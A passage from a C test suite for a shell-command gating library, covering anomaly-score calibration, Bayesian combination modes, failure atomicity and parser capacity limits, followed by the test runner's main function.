    size_t samples = order == 2 ? 128 : 4;
    sg_result_t result;
    for (size_t i = 0; ok && i <= samples; i++) {
      ok = eval_cmd(gate, calibration_commands[0], &result) == SG_OK;
      double expected =
          i < samples
              ? 0.5 * (result.anomaly_score_raw + result.anomaly_score_type)
              : 0.0;
      ok = ok && result.anomaly_score == expected && !result.anomaly_detected;
    }
    sg_gate_free(gate);
  }
  ASSERT(ok);
}

TEST(bayesian_warmup_window_resize) {
  sg_gate_t *gate = calibration_gate(100);
  ASSERT(gate != NULL);
  bool ok = sg_gate_set_anomaly_adaptive(gate, true, 4) == SG_OK &&
            sg_gate_set_anomaly_combine_mode(
                gate, SG_ANOMALY_COMBINE_BAYESIAN) == SG_OK;
  sg_result_t result;
  for (size_t i = 0; ok && i < 4; i++)
    ok = eval_cmd(gate, calibration_commands[0], &result) == SG_OK;
  ok = ok && eval_cmd(gate, calibration_commands[0], &result) == SG_OK &&
       result.anomaly_score == 0.0;
  /* Retain five component samples but require eight after growing the window.
   * Exactly three more evaluations use weighted fallback. */
  ok = ok && sg_gate_set_anomaly_adaptive(gate, true, 8) == SG_OK;
  for (size_t i = 0; ok && i < 4; i++) {
    ok = eval_cmd(gate, calibration_commands[0], &result) == SG_OK;
    double weighted =
        0.5 * (result.anomaly_score_raw + result.anomaly_score_type);
    ok = ok && result.anomaly_score == (i < 3 ? weighted : 0.0);
  }
  ok = ok && sg_gate_set_anomaly_adaptive(gate, true, 2) == SG_OK &&
       eval_cmd(gate, calibration_commands[0], &result) == SG_OK &&
       result.anomaly_score == 0.0;
  /* Nine samples plus the one after shrinking are retained. Adaptive-off
   * readiness requires 128, not the last configured two-sample window. */
  ok = ok && sg_gate_set_anomaly_adaptive(gate, false, 0) == SG_OK;
  for (size_t i = 10; ok && i <= 128; i++) {
    ok = eval_cmd(gate, calibration_commands[0], &result) == SG_OK;
    double weighted =
        0.5 * (result.anomaly_score_raw + result.anomaly_score_type);
    ok = ok && result.anomaly_score == (i < 128 ? weighted : 0.0);
  }
  ok = ok && sg_gate_set_anomaly_adaptive(gate, true, 2) == SG_OK &&
       eval_cmd(gate, calibration_commands[0], &result) == SG_OK &&
       result.anomaly_score == 0.0;
  sg_gate_free(gate);
  ASSERT(ok);
}

TEST(anomaly_model_load_resets_calibration) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = calibration_gate(1);
  ASSERT(source != NULL);
  bool ok = sg_gate_save_anomaly_model(source, path) == SG_OK;
  sg_gate_free(source);
  for (unsigned bayesian = 0; ok && bayesian < 2; bayesian++) {
    sg_gate_t *target = calibration_gate(100);
    sg_gate_t *control = calibration_gate(100);
    ASSERT(target != NULL && control != NULL);
    ok = sg_gate_set_anomaly_adaptive(target, true, 3) == SG_OK &&
         sg_gate_set_anomaly_adaptive(control, true, 3) == SG_OK &&
         sg_gate_set_anomaly_k_factor(target, 0.0) == SG_OK &&
         sg_gate_set_anomaly_k_factor(control, 0.0) == SG_OK;
    if (bayesian)
      ok = ok &&
           sg_gate_set_anomaly_combine_mode(
               target, SG_ANOMALY_COMBINE_BAYESIAN) == SG_OK &&
           sg_gate_set_anomaly_combine_mode(
               control, SG_ANOMALY_COMBINE_BAYESIAN) == SG_OK;
    sg_result_t actual, expected;
    for (size_t i = 0; ok && i < 6; i++)
      ok = eval_cmd(target, calibration_commands[0], &actual) == SG_OK;
    ok = ok && sg_gate_load_anomaly_model(target, path) == SG_OK &&
         sg_gate_load_anomaly_model(control, path) == SG_OK;
    for (size_t i = 0; ok && i < 7; i++) {
      ok = eval_cmd(target, calibration_commands[0], &actual) == SG_OK &&
           eval_cmd(control, calibration_commands[0], &expected) == SG_OK &&
           actual.anomaly_score == expected.anomaly_score &&
           actual.anomaly_detected == expected.anomaly_detected &&
           !actual.anomaly_detected;
      if (ok && i == 0)
        ok = actual.anomaly_score > 0.25;
    }
    sg_gate_free(control);
    sg_gate_free(target);
  }
  ASSERT(ok);
}

TEST(anomaly_calibration_failure_atomicity) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);
  sg_gate_t *source = calibration_gate(1);
  ASSERT(source != NULL);
  bool ok = sg_gate_save_anomaly_model(source, path) == SG_OK;
  sg_gate_free(source);
  char malformed[320];
  snprintf(malformed, sizeof(malformed), "%s.bad", path);
  FILE *file = fopen(malformed, "wb");
  ASSERT(file != NULL);
  ok = ok && fputs("not an anomaly bundle", file) >= 0;
  ok = fclose(file) == 0 && ok;
  register_temp_file(malformed);
  for (unsigned bayesian = 0; ok && bayesian < 2; bayesian++) {
    sg_gate_t *gate = calibration_gate(100);
    ASSERT(gate != NULL);
    ok = sg_gate_set_anomaly_adaptive(gate, true, 4) == SG_OK;
    if (bayesian)
      ok = ok && sg_gate_set_anomaly_combine_mode(
                     gate, SG_ANOMALY_COMBINE_BAYESIAN) == SG_OK;
    sg_result_t result;
    for (size_t i = 0; ok && i < 8; i++)
      ok = eval_cmd(gate, calibration_commands[0], &result) == SG_OK;
    sg_anomaly_sequence_score_t before = {0}, after = {0};
    ok = ok && calibration_score(gate, "gcc ; make ; strip", &before) &&
         before.detected;
    size_t vocab = test_anomaly_vocabulary(gate);
    for (unsigned failure = 0; ok && failure < 10; failure++) {
      sg_error_t status, expected = SG_ERR_MEMORY;
      switch (failure) {
      case 0:
        sg_test_alloc_fail_at(1);
        status = sg_gate_set_anomaly_adaptive(gate, true, 16);
        sg_test_alloc_reset();
        break;
      case 1:
      case 2:
        if (bayesian)
          continue; /* Histograms already exist: no allocation is needed. */
        sg_test_alloc_fail_at(failure);
        status =
            sg_gate_set_anomaly_combine_mode(gate, SG_ANOMALY_COMBINE_BAYESIAN);
        sg_test_alloc_reset();
        break;
      case 3:
        status = sg_gate_set_anomaly_combine_mode(
            gate, (sg_anomaly_combine_mode_t)99);
        expected = SG_ERR_INVALID;
        break;
      case 4:
        status = sg_gate_set_anomaly_weights(gate, -1.0, 2.0);
        expected = SG_ERR_INVALID;
        break;
      case 5:
        status = sg_gate_set_anomaly_k_factor(gate, NAN);
        expected = SG_ERR_INVALID;
        break;
      case 6:
        sg_test_alloc_fail_at(1);
        status = sg_gate_load_anomaly_model(gate, path);
        sg_test_alloc_reset();
        break;
      case 7:
        sg_test_io_fail_at(1);
        status = sg_gate_load_anomaly_model(gate, path);
        sg_test_io_reset();
        expected = SG_ERR_IO;
        break;
      case 8:
        sg_test_locale_fail_with_errno(ENOMEM);
        status = sg_gate_load_anomaly_model(gate, path);
        break;
      default:
        status = sg_gate_load_anomaly_model(gate, malformed);
        expected = SG_ERR_PARSE;
        break;
      }
      ok = status == expected && test_anomaly_vocabulary(gate) == vocab &&
           calibration_score(gate, "gcc ; make ; strip", &after) &&
           after.detected == before.detected &&
           after.combined_score == before.combined_score &&
           after.raw_score == before.raw_score &&
           after.type_score == before.type_score;
    }
    sg_gate_free(gate);
  }
  ASSERT(ok);
}

TEST(bayesian_calibration_commit_atomicity) {
  static const sg_anomaly_status_t update_failures[] = {
      SG_ANOMALY_ERR_MEMORY, SG_ANOMALY_ERR_LIMIT, SG_ANOMALY_ERR_FORMAT};
  bool ok = true;
  for (size_t failure = 0; ok && failure < 4; failure++) {
    sg_gate_t *gate = calibration_gate(100);
    sg_gate_t *control = calibration_gate(100);
    ASSERT(gate != NULL && control != NULL);
    ok = sg_gate_set_anomaly_update_mode(gate, false) == SG_OK &&
         sg_gate_set_anomaly_update_mode(control, false) == SG_OK &&
         sg_gate_set_anomaly_adaptive(gate, true, 3) == SG_OK &&
         sg_gate_set_anomaly_adaptive(control, true, 3) == SG_OK &&
         sg_gate_set_anomaly_combine_mode(gate, SG_ANOMALY_COMBINE_BAYESIAN) ==
             SG_OK &&
         sg_gate_set_anomaly_combine_mode(control,
                                          SG_ANOMALY_COMBINE_BAYESIAN) == SG_OK;
    sg_result_t actual, expected;
    for (size_t i = 0; ok && i < 2; i++)
      ok = eval_cmd(gate, calibration_commands[0], &actual) == SG_OK &&
           eval_cmd(control, calibration_commands[0], &expected) == SG_OK;
    /* The next committed sample makes the CDF ready. A failed learning or
     * diagnostic transaction must not advance that boundary or reset the
     * adaptive window: retrying must match a gate with no failed attempt. */
    if (ok) {
      if (failure < 3) {
        sg_test_anomaly_update_fail_with(update_failures[failure]);
        sg_error_t status = eval_cmd(gate, calibration_commands[0], &actual);
        sg_test_anomaly_result_reset();
        sg_anomaly_update_t outcome =
            failure == 0   ? SG_ANOMALY_UPDATE_FAILED_MEMORY
            : failure == 1 ? SG_ANOMALY_UPDATE_REJECTED_LIMIT
                           : SG_ANOMALY_UPDATE_FAILED_FORMAT;
        ok = status == (failure == 2 ? SG_ERR_PARSE : SG_OK) &&
             actual.anomaly_update == outcome;
      } else {
        ok = eval_with_prefix(gate, calibration_commands[0], 1, &actual) ==
             SG_ERR_TRUNC;
      }
    }
    for (size_t i = 0; ok && i < 5; i++) {
      ok = eval_cmd(gate, calibration_commands[0], &actual) == SG_OK &&
           eval_cmd(control, calibration_commands[0], &expected) == SG_OK &&
           actual.anomaly_score_raw == expected.anomaly_score_raw &&
           actual.anomaly_score_type == expected.anomaly_score_type &&
           actual.anomaly_score == expected.anomaly_score &&
           actual.anomaly_detected == expected.anomaly_detected &&
           actual.verdict == expected.verdict && !actual.anomaly_detected;
      if (ok)
        ok = i == 0 ? actual.anomaly_score > 0.0 : actual.anomaly_score == 0.0;
    }
    sg_gate_free(control);
    sg_gate_free(gate);
  }
  ASSERT(ok);
}

TEST(bayesian_combination_transitions) {
  static const char *normal[] = {
      "ls ; cat file.txt ; pwd",
      "cat file.txt ; grep pattern ; sort",
      "echo hello ; sleep 1 ; true",
      "cp a b ; mv b c ; rm c",
  };
  static const char *unseen = "gcc ; make ; strip";
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);

  sg_result_t result;
  for (int i = 0; i < 100; i++)
    ASSERT(eval_cmd(g, normal[i % 4], &result) == SG_OK);

  /* Freeze the trained model so only the empirical CDF changes below. */
  ASSERT(sg_gate_set_anomaly_update_mode(g, true) == SG_OK);
  ASSERT(sg_gate_set_anomaly_combine_mode(g, SG_ANOMALY_COMBINE_BAYESIAN) ==
         SG_OK);
  ASSERT(eval_cmd(g, "ls", &result) == SG_OK);
  ASSERT(result.anomaly_score == 0.0);
  ASSERT(!result.anomaly_detected);

  /* The first 128 full sequences use weighted fallback while populating the
   * default-size empirical distributions. */
  for (int i = 0; i < 128; i++) {
    ASSERT(eval_cmd(g, normal[i % 4], &result) == SG_OK);
    double weighted =
        result.anomaly_score_raw * 0.5 + result.anomaly_score_type * 0.5;
    ASSERT(fabs(result.anomaly_score - weighted) < 1e-12);
  }

  ASSERT(eval_cmd(g, normal[0], &result) == SG_OK);
  double normal_bayesian = result.anomaly_score;
  ASSERT(eval_cmd(g, unseen, &result) == SG_OK);
  double unseen_bayesian = result.anomaly_score;
  ASSERT(result.anomaly_score_raw > 0.0);
  ASSERT(unseen_bayesian > normal_bayesian);

  ASSERT(sg_gate_set_anomaly_combine_mode(g, SG_ANOMALY_COMBINE_WEIGHTED) ==
         SG_OK);
  ASSERT(eval_cmd(g, unseen, &result) == SG_OK);
  double weighted =
      result.anomaly_score_raw * 0.5 + result.anomaly_score_type * 0.5;
  ASSERT(fabs(result.anomaly_score - weighted) < 1e-12);
  ASSERT(result.anomaly_score != unseen_bayesian);
  sg_gate_free(g);
}

/* --- MAIN --- */

TEST(substitution_capacity_fails_closed) {
  sg_gate_t *gate =
      gate_with_rules((const char *[]){"exec", "probe", "echo *", "cat *",
                                       "cat", "producer", "export *"},
                      7);
  ASSERT_NOT_NULL(gate);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  bool valid = true;
  for (unsigned anomaly = 0; anomaly < 2; anomaly++) {
    if (anomaly && sg_gate_enable_anomaly(gate, 1e300, NULL) != SG_OK) {
      valid = false;
      break;
    }
    for (size_t i = 0;
         i < sizeof(shellsplit_test_substitution_capacity_cases) /
                 sizeof(shellsplit_test_substitution_capacity_cases[0]);
         i++) {
      for (unsigned changes = SHELL_DEP_TIME_MAX_EXTERNAL_FDS - 1;
           changes <= SHELL_DEP_TIME_MAX_EXTERNAL_FDS; changes++) {
        char source[4096];
        size_t length;
        if (!shellsplit_test_substitution_capacity_source(
                source, sizeof(source), changes,
                shellsplit_test_substitution_capacity_cases[i], &length)) {
          valid = false;
          continue;
        }
        sg_result_t result;
        sg_error_t error = eval_cmd(gate, source, &result);
        bool complete = changes < SHELL_DEP_TIME_MAX_EXTERNAL_FDS;
        bool expected = complete
                            ? error == SG_OK && !result.truncated
                            : error == SG_ERR_TRUNC && result.truncated &&
                                  result.subcommand_truncated &&
                                  result.verdict == SG_VERDICT_UNDETERMINED;
        if (complete) {
          bool producer = false;
          for (size_t command = 0; command < result.subcommand_count; command++)
            producer |= result.subcommands[command].netargv_length == 11 &&
                        memcmp(result.subcommands[command].netargv,
                               "8:producer,", 11) == 0;
          expected = expected && producer;
        }
        if (!expected) {
          printf("\n    capacity tail %s changes=%u anomaly=%u: error=%d "
                 "verdict=%d truncated=%d\n",
                 shellsplit_test_substitution_capacity_cases[i], changes,
                 anomaly, error, result.verdict, result.truncated);
          valid = false;
        }
      }
    }
  }
  sg_gate_free(gate);
  ASSERT(valid);
}

TEST(malformed_source_before_capacity) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"echo *"}, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  bool valid = true;
  for (size_t prefix = 0; prefix < 2; prefix++) {
    for (size_t i = 0; i < sizeof(shellsplit_test_malformed_tails) /
                               sizeof(shellsplit_test_malformed_tails[0]);
         i++) {
      char input[4096];
      size_t length = 0;
      if (!shellsplit_test_source_with_tail(
              input, sizeof(input), prefix ? SHELL_MAX_SUBCOMMANDS + 1 : 0,
              shellsplit_test_malformed_tails[i], &length)) {
        valid = false;
        break;
      }
      sg_result_t result;
      sg_error_t error = eval_cmd(gate, input, &result);
      if (error != SG_ERR_PARSE || result.verdict != SG_VERDICT_REJECT) {
        printf("    malformed source %zu prefix %zu: error=%d verdict=%d\n", i,
               prefix, error, result.verdict);
        valid = false;
      }
    }
  }
  sg_gate_free(gate);
  ASSERT(valid);
}

TEST(forward_literal_word_policy_contract) {
  sg_gate_t *gate = gate_with_rules((const char *[]){"printf *"}, 1);
  ASSERT_NOT_NULL(gate);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));
  for (unsigned family = 0; family < 3; family++) {
    for (size_t count = 32; count <= 96; count *= 2) {
      char source[256], word[224];
      size_t length = 0;
      word[length++] = 'x';
      memset(word + length, family == 2 ? '[' : '{', count);
      length += count;
      memcpy(word + length, "literal", 7);
      length += 7;
      if (family == 1) {
        memset(word + length, '}', count);
        length += count;
      }
      word[length] = '\0';
      snprintf(source, sizeof(source), "printf %s", word);
      for (unsigned pass = 0; pass < 2; pass++) {
        sg_result_t result = {0};
        ASSERT_SG_OK(eval_cmd(gate, source, &result));
        ASSERT(result.verdict == SG_VERDICT_ALLOW &&
               result.subcommand_count == 1);
        ASSERT(!result.requires_substitution_evaluation);
        ASSERT(!result.has_dynamic_substitution_io);
        shell_netstring_iter_t args;
        shell_netstring_view_t arg;
        ASSERT(shell_netstring_iter_init(
                   &args, result.subcommands[0].netargv,
                   result.subcommands[0].netargv_length) == SHELL_NETSTRING_OK);
        ASSERT(shell_netstring_iter_next(&args, &arg) == SHELL_NETSTRING_OK);
        ASSERT(shell_netstring_iter_next(&args, &arg) == SHELL_NETSTRING_OK &&
               arg.payload_length == length &&
               memcmp(arg.payload, word, length) == 0);
        ASSERT(shell_netstring_iter_next(&args, &arg) == SHELL_NETSTRING_DONE);
        if (pass != 0)
          ASSERT(isfinite(result.anomaly_score));
      }
    }
  }
  sg_gate_free(gate);
}

int main(int argc, char **argv) {
  ASSERT(atexit(cleanup_temp_files) == 0);
  if (argc == 2 && strcmp(argv[1], "--contextual-anomaly") == 0) {
    RUN(contextual_read_anomaly_contract);
    RUN(contextual_read_anomaly_allocation_failures);
    RUN(truncated_graph_skips_anomaly_work);
    return fail_count ? EXIT_FAILURE : EXIT_SUCCESS;
  }
  RUN(temp_fixture_cleanup);
  RUN(policy_binding_lifecycle);
  RUN(anomaly_component_borrowed_views);
  RUN(malformed_source_before_capacity);
  RUN(substitution_capacity_fails_closed);
  printf("shellgate tests\n\n");

  printf("Lifecycle:\n");
  RUN(gate_api_contract_matrix);
  RUN(shell_list_parse_boundary_contract);
  RUN(raw_close_marker_shellgate_contract);
  RUN(word_fragment_operator_shellgate_contract);
  RUN(setter_matrix);

  printf("\nBasic evaluation:\n");
  RUN(basic_evaluation_matrix);
  RUN(composition_verdict_matrix);
  RUN(composition_policy_matrix);
  RUN(compound_group_execution_context_contract);
  RUN(posix_brace_group_pipeline);
  RUN(compound_status_named_fd_continuation);
  RUN(bash_pipe_both_policy_contract);
  RUN(repeated_pipeline_negation_policy_contract);
  RUN(bash_pipeline_time_policy_contract);
  RUN(inherited_boundary_context_contract);
  RUN(setup_diagnostic_substitution_contract);
  RUN(expansion_diagnostic_substitution_contract);
  RUN(cd_command_and_capture_contract);
  RUN(assignment_stream_and_diagnostic_contract);
  RUN(rejected_assignment_effect_contract);
  RUN(nested_setup_diagnostic_context_contract);
  RUN(background_newline_cwd_contract);
  RUN(background_compound_completion_contract);
  RUN(descriptor_scope_policy_contract);
  RUN(timed_pipeline_ordinary_time_policy_contract);
  RUN(grouped_empty_time_io_policy_contract);
  RUN(empty_timing_substitution_policy_contract);
  RUN(posix_brace_group_sibling_pipeline_policy_contract);
  RUN(posix_brace_group_policy_and_anomaly_contract);
  RUN(posix_brace_group_document_policy_contract);
  RUN(posix_brace_group_descriptor_document_policy_contract);
  RUN(posix_brace_group_crlf_document_policy_contract);
  RUN(posix_brace_group_multiple_document_policy_contract);
  RUN(posix_brace_group_document_pipeline_policy_contract);
  RUN(brace_group_redirect_and_operator_policy_contract);
  RUN(nested_brace_group_canonical_policy_contract);
  RUN(brace_group_maximum_depth_contract);
  RUN(strict_heredoc_completion_contract);
  RUN(canonical_heredoc_delimiter_contract);
  RUN(brace_local_document_policy_contract);
  RUN(nested_composition_matrix);
  RUN(nested_quoted_expansion_boundaries);
  RUN(dynamic_arithmetic_is_semantically_rejected);
  RUN(quoted_arithmetic_semantic_contract);
  RUN(builtin_option_semantic_contract);
  RUN(completion_and_readline_reject_before_policy_and_learning);
  RUN(variable_predicates_reject_before_policy_and_learning);
  RUN(getopts_rejects_before_policy_and_learning);
  RUN(getopts_preserves_unrelated_descriptor_policy);
  RUN(cd_descriptor_effect_policy_contract);
  RUN(locale_quote_scope_policy_contract);
  RUN(backtick_escape_semantic_contract);
  RUN(scoped_heredoc_semantic_contract);
  RUN(file_substitution_reject_mask_contract);
  RUN(nested_feature_rejection_contract);
  RUN(static_arithmetic_literal_contract);
  RUN(variable_presence_contract);
  RUN(filesystem_predicate_contract);
  RUN(conditional_string_contract);
  RUN(builtin_test_grammar_contract);
  RUN(command_token_capacity_contract);
  RUN(continued_expansion_policy_contract);
  RUN(continued_punctuation_policy_contract);
  RUN(dynamic_substitution_flow_contract);
  RUN(herestring_and_transformed_substitution_provenance);
  RUN(substitution_sensitive_alias_worklist);
  RUN(brace_group_process_substitution_result_contract);
  RUN(group_process_substitution_dynamic_consumer_contract);
  RUN(substitution_stream_resource_contract);
  RUN(substitution_source_word_contract);
  RUN(expansion_phases_survive_failed_setup);
  RUN(expansion_control_effects_require_reachable_setup);
  RUN(process_substitution_interpreter_input_contract);
  RUN(process_substitution_direction_contract);
  RUN(process_pipe_descriptor_policy_contract);
  RUN(process_substitution_operand_syntax_contract);
  RUN(composite_process_substitution_contract);
  RUN(composite_redirect_anomaly_cache_equivalence);
  RUN(compound_word_policy_netargv_contract);
  RUN(empty_process_word_policy_contract);
  RUN(command_position_group_syntax_contract);
  RUN(substitution_comment_and_heredoc_capacity_contract);
  RUN(compound_heredoc_substitution_cross_product_contract);
  RUN(compound_brace_substitution_boundary_contract);
  RUN(anomaly_group_heredoc_substitution_contract);
  RUN(anomaly_large_quoted_delimiter_workspace);
  RUN(heredoc_phase_policy_boundary);
  RUN(anomaly_mixed_heredoc_substitution_contract);

  printf("\nFeature rejection:\n");
  RUN(conditional_substitution_matrix);
  RUN(process_substitution_wildcard_policy);
  RUN(named_fd_process_substitution_policy_contract);
  RUN(forward_literal_word_policy_contract);
  RUN(named_fd_builtin_mutation_redirect_policy_contract);
  RUN(named_fd_builtin_operand_policy_contract);
  RUN(named_fd_builtin_ordered_assignment_policy_contract);
  RUN(quoted_named_fd_mutation_policy_contract);
  RUN(decoded_assignment_policy_contract);

  printf("\nSuggestions:\n");
  RUN(suggestion_matrix);
  RUN(match_only_path_avoids_suggestion_allocations);
  RUN(complete_and_oversized_suggestions);
  RUN(contextual_policy_mutations_preserve_verdicts);

  printf("\nEdge cases:\n");
  RUN(eval_input_contract_matrix);
  RUN(combined_redirect_prefix_word_contract);
  RUN(redirect_only_operation_is_undetermined);
  RUN(named_document_policy_and_stage_contract);
  RUN(redirect_boundary_policy_and_anomaly_contract);
  RUN(descriptor_word_policy_and_cache_contract);
  RUN(comment_only_source_does_not_trigger_feature_rejection);

  printf("\nConfiguration:\n");
  RUN(stop_mode_matrix);
  RUN(stop_mode_substitution_prefix);
  RUN(stop_mode_group_redirect_entry_order);
  RUN(pipeline_many_subcommands);
  RUN(reject_mask_feature_matrix);
  RUN(default_reject_mask_catches_continued_arithmetic);

  printf("\nPolicy management:\n");
  RUN(policy_mutation_matrix);
  RUN(canonical_policy_mutation_matrix);
  RUN(binary_canonical_policy_mutations);
  RUN(binary_cpl_policy_contract);
  RUN(ansi_nul_source_rejection);
  RUN(arithmetic_command_policy);
  RUN(nested_ansi_escape_policy);
  RUN(policy_replacement_failure_atomicity);
  RUN(policy_evaluation_allocation_failure);

  printf("\nSerialization:\n");
  RUN(policy_persistence_matrix);

  printf("\nBuffer management:\n");
  RUN(eval_workspace_prefix_boundaries);
  RUN(buffer_contract_matrix);
  RUN(graph_result_fields_stay_out_of_workspace);
  RUN(final_diagnostic_truncation_fails_closed);
  RUN(suggestion_streaming_buffer_contract);

  printf("\nExpansion callbacks:\n");
  RUN(expansion_callback_matrix);
  RUN(expansion_query_semantics);
  RUN(expansion_rejection_precedes_callback);
  RUN(binary_expansion_callback_contract);
  RUN(expansion_error_diagnostic_boundaries);
  RUN(whole_word_expansion_context_contract);
  RUN(assignment_tilde_expansion_contract);
  RUN(tilde_path_identity_expansion_contract);
  RUN(tilde_cwd_expansion_contract);
  RUN(resolved_argument_violation_equivalence);
  RUN(resolved_argument_binary_and_fallback_contract);
  RUN(resolved_substitution_argument_file_relations);
  RUN(resolved_filename_substitution_consumer_contract);
  RUN(resolved_arguments_linear_work);
  RUN(expansion_operand_eligibility_contract);
  RUN(printf_expansion_control_contract);
  RUN(substitution_blank_byte_contract);
  RUN(expansion_unresolved_flags_contract);
  RUN(expansion_flags_stop_modes);
  RUN(expansion_flags_precede_output_failures);
  RUN(expansion_flags_resolved_values);
  RUN(expansion_flags_linear_metadata);
  RUN(nested_path_expansion_ownership);
  RUN(nested_path_expansion_stop_and_truncation);
  RUN(nested_path_expansion_linear_metadata);
  RUN(expansion_path_failure_and_reachability_contract);
  RUN(resolved_named_redirect_failure_effects);
  RUN(empty_path_static_resolved_equivalence);
  RUN(static_empty_path_callback_reachability);
  RUN(resolved_path_workspace_capacity_and_retry);
  RUN(resolved_path_identity_pool_capacity);
  RUN(substitution_status_callback_reachability);
  RUN(resolved_file_violation_details);
  RUN(file_substitution_path_failure_is_local);
  RUN(file_substitution_diagnostic_receiver);
  RUN(expansion_bounds_matrix);
  RUN(truncation_cross_product_matrix);

  printf("\nViolation scanning:\n");
  RUN(violation_rule_matrix);
  RUN(file_identity_violation_paths);
  RUN(path_fragment_match_matrix);
  RUN(path_fragment_linear_work);
  RUN(path_fragment_configuration_atomicity);
  RUN(file_identity_index_contract);
  RUN(shared_cwd_path_index_contract);
  RUN(shared_cwd_path_linear_work);
  RUN(shared_cwd_fragment_branching_work);
  RUN(resolved_status_builtin_evaluation);
  RUN(exit_outcome_evaluation);
  RUN(graph_analysis_scaling);
  RUN(optional_violation_index_and_compound_completion);
  RUN(fd_open_violation_contract);
  RUN(descriptor_move_evaluation);
  RUN(descriptor_setup_dispatch);
  RUN(current_shell_builtin_graph_effects);
  RUN(fd_open_dynamic_filename_consumer_contract);
  RUN(group_owned_violation_context);
  RUN(group_owned_multiple_redirect_violation_context);
  RUN(nested_group_owned_violation_scope);
  RUN(violation_configuration_matrix);
  RUN(configured_shell_executable_matching);
  RUN(quoted_environment_name_violation);
  RUN(violation_configuration_replacement_is_atomic);
  RUN(scope_outcome_writer_violations);
  RUN(named_fd_cleanup_consumer_violations);
  RUN(named_fd_ifs_consumer_violations);
  RUN(reachability_cwd_sensitive_paths);
  RUN(violation_capacity_contract);
  RUN(violation_dropped_types_remain_aggregated);
  RUN(violation_absence_matrix);

  printf("\nHelpers:\n");
  RUN(helper_contracts);
  RUN(glob_pattern_in_rule);

  printf("\nProperty tests:\n");
  srand(42);
  RUN(property_suggestion_leads_to_allow);

  printf("\nAnomaly detection:\n");
  RUN(anomaly_enable_disable);
  RUN(anomaly_learning_policy_matrix);
  RUN(anomaly_scoring_contract_matrix);
  RUN(anomaly_model_roundtrip);
  RUN(anomaly_bundle_roundtrip_retains_empty_stage);
  RUN(anomaly_bundle_corruption_matrix);
  RUN(anomaly_bundle_inner_header_framing);
  RUN(anomaly_bundle_locale_independence);
  RUN(anomaly_bundle_failure_atomicity);
  RUN(anomaly_bundle_path_and_mode_boundaries);
  RUN(anomaly_bundle_load_allocation_failure);
  RUN(anomaly_bundle_save_temporary_stream_error_mapping);
  RUN(anomaly_bundle_stream_failure_matrix);
  RUN(anomaly_bundle_verified_snapshot);
  RUN(anomaly_bundle_mutation_failure_atomicity);
  RUN(exec_returning_paths_consumer_violations);
  RUN(exec_scalar_alias_preserves_effective_command);
  RUN(anomaly_allocation_failure_matrix);
  RUN(anomaly_calibration_matrix);
  RUN(anomaly_weight_matrix);
  RUN(anomaly_netseq_score_contract);
  RUN(anomaly_configuration_validation);

  printf("\nAdaptive threshold:\n");
  RUN(anomaly_adaptive_threshold_transitions);
  RUN(anomaly_adaptive_default_k_factor);

  printf("\nType sequence cache:\n");
  RUN(anomaly_cache_equivalence_matrix);
  RUN(contextual_read_anomaly_contract);
  RUN(contextual_read_anomaly_allocation_failures);
  RUN(truncated_graph_skips_anomaly_work);
  RUN(anomaly_cache_allocation_failure_matrix);
  RUN(anomaly_type_netseq_allocation_failure);
  RUN(anomaly_model_failure_verdict_contract);
  RUN(anomaly_update_outcome_contract);
  RUN(anomaly_update_reuses_scored_netseq);
  RUN(anomaly_ansi_c_netseq_update);
  RUN(anomaly_cache_model_transition_matrix);

  printf("\nSeparate scores:\n");
  RUN(anomaly_short_aligned_sequence_stays_finite);
  RUN(truncated_parse_without_subcommands_is_undetermined);

  printf("\nBayesian combination:\n");
  RUN(anomaly_calibration_mode_changes);
  RUN(bayesian_adaptive_effective_transition);
  RUN(anomaly_weight_calibration_transitions);
  RUN(bayesian_warmup_configuration_order);
  RUN(bayesian_warmup_window_resize);
  RUN(anomaly_model_load_resets_calibration);
  RUN(anomaly_calibration_failure_atomicity);
  RUN(bayesian_calibration_commit_atomicity);
  RUN(bayesian_combination_transitions);

  cleanup_temp_files();
  printf("\n========================================\n");
  printf("Results: %d passed, %d failed\n", pass_count, fail_count);
  return fail_count > 0 ? 1 : 0;
}
